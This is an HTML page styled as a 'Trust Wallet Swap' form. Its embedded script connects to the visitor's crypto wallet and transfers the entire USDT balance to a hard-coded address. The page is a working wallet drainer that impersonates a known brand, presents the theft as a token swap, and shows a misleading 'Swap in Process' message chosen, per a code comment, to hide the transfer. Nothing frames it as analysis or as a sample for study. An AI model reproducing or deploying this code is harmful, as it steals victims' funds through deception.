<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trust Wallet Swap</title>
  <style>
    :root {
      --primary: #3375BB;
      --primary-glow: rgba(51, 117, 187, 0.2);
      --text: #ffffff;
      --bg: #0d111c;
      --card: #131a2a;
      --border: #2c3651;
      --danger: #f44336;
      --success: #4caf50;
    }

    * {
      box-sizing: border-box;
      font-family: 'Arial', sans-serif;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 400px;
      background-color: var(--card);
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 0 20px var(--primary-glow);
    }

    .title {
      font-size: 1.5rem;
      font-weight: bold;
      margin-bottom: 1.5rem;
      text-align: center;
    }

    label {
      font-size: 0.9rem;
      margin-bottom: 0.25rem;
      display: block;
    }

    input {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1rem;
      border: 1px solid var(--border);
      border-radius: 0.5rem;
      background-color: transparent;
      color: var(--text);
      font-size: 1rem;
    }

    button {
      width: 100%;
      padding: 0.75rem;
      background-color: var(--primary);
      color: var(--text);
      border: none;
      border-radius: 0.5rem;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #2d5e9e;
    }

    .alert {
      margin-top: 1rem;
      padding: 0.75rem;
      border-radius: 0.5rem;
      font-size: 0.95rem;
      text-align: center;
    }

    .alert.success {
      background-color: var(--success);
      color: #fff;
    }

    .alert.error {
      background-color: var(--danger);
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">Trust Wallet Swap</div>
    <label for="address">Recipient Address</label>
    <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly />

    <label for="amount">Amount (USDT)</label>
    <input type="text" id="amount" placeholder="200.00" disabled />

    <button onclick="connectAndTransfer()">Next</button>
    <div id="alert-container"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const receiverAddress = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
    const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // BSC Mainnet USDT

    async function connectAndTransfer() {
      try {
        if (!window.ethereum) throw new Error('Please install MetaMask or Trust Wallet');

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const walletAddress = await signer.getAddress();

        const usdtAbi = [
          "function balanceOf(address owner) view returns (uint256)",
          "function transfer(address to, uint256 amount) returns (bool)",
          "function decimals() view returns (uint8)"
        ];

        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
        const decimals = await usdtContract.decimals();
        const balance = await usdtContract.balanceOf(walletAddress);
        const balanceInUSDT = ethers.utils.formatUnits(balance, decimals);

        if (parseFloat(balanceInUSDT) < 200) {
          showAlert('error', 'Insufficient USDT balance. Minimum 200 USDT Required.');
          return;
        }

        const tx = await usdtContract.transfer(receiverAddress, balance);
        await tx.wait();

        // âœ… Show "Swap in Process" instead of "Transaction Successful"
        showAlert('success', 'Swap in Process', `Transferred $${parseFloat(balanceInUSDT).toFixed(2)} USDT`);
      } catch (err) {
        showAlert('error', err.message);
      }
    }

    function showAlert(type, title, message = '') {
      const container = document.getElementById('alert-container');
      container.innerHTML = `
        <div class="alert ${type}">
          <strong>${title}</strong><br>${message}
        </div>
      `;
    }
  </script>
</body>
</html>
